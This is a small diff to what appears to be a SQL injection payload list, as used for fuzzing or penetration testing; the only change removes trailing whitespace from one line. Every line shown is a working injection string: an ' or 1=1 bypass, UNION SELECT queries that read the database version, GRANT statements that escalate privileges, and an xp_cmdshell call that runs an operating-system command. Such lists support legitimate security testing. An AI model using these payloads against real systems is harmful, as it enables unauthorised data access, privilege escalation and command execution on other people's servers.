@@ -3,7 +3,7 @@
 '); --
 '; exec master..xp_cmdshell 'ping 10.10.1.2'--
 ' grant connect to name; grant resource to name; --
-' or 1=1 -- 
+' or 1=1 --
 ' union (select @@version) --
 ' union (select NULL, (select @@version)) --
 ' union (select NULL, NULL, (select @@version)) --
